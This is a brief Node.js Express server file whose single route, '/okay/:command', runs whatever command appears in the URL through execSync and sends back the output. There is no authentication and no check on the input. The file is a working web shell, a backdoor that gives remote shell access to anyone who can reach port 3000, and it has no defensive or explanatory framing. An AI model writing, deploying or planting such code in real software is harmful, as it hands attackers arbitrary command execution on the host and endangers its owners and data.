const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
